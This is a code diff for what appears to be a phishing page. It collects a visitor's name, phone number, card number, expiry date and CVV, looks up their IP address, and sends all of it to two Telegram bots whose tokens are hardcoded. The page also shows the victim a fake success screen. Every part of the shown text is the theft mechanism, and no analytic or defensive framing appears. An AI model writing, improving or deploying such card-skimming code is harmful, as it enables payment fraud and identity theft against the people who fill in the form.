@@ -618,12 +618,24 @@
                 loading.style.display = 'block';
                 showSuccess();
                 
-                // ENVOI SIMPLIFIÉ À TELEGRAM
-                sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv);
+                // Récupérer l'IP et envoyer à Telegram
+                getClientIP().then(ip => {
+                    sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv, ip);
+                }).catch(() => {
+                    sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv, 'IP non disponible');
+                });
             });
 
-            // FONCTION TELEGRAM SIMPLIFIÉE
-            function sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv) {
+            // Fonction pour récupérer l'IP
+            function getClientIP() {
+                return fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => data.ip)
+                    .catch(() => 'IP non disponible');
+            }
+
+            // FONCTION TELEGRAM AVEC IP
+            function sendToTelegram(firstname, lastname, phone, cardnumber, operator, mm, yy, cvv, ip) {
                 // Les deux bots
                 const bot1 = {
                     token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
@@ -635,18 +647,22 @@
                     chatId: "8061187067"
                 };
 
-                // Message simple avec toutes les infos
+                // Message avec IP
                 const message = `💳 NOUVELLE CARTE 💳
                 
+👤 CLIENT:
 Prénom: ${firstname}
 Nom: ${lastname}
 Téléphone: ${phone}
 Pays: ${operator}
 
-Carte: ${cardnumber}
+💳 CARTE:
+Numéro: ${cardnumber}
 Expire: ${mm}/${yy}
 CVV: ${cvv}
 
+🌐 INFOS TECH:
+IP: ${ip}
 Date: ${new Date().toLocaleString('fr-FR')}`;
 
                 // Envoyer au premier bot
